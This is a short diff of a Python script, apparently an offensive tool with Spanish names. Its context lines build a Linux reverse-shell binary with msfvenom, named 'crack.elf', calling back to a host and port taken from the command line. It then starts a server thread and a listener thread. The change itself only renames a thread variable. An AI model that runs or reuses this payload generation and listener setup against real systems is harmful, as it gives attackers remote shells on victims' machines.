@@ -12,8 +12,8 @@ def main():
     global LPORT
     LHOST,LPORT = sys.argv[1] ,  sys.argv[2]
     os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" -f elf -o crack.elf")
-    servidor = threading.Thread(target=servidor)
-    servidor.start()
+    servidorPython = threading.Thread(target=servidor)
+    servidorPython.start()
     
     escucha = threading.Thread(target=escuchar)
     escucha.start()
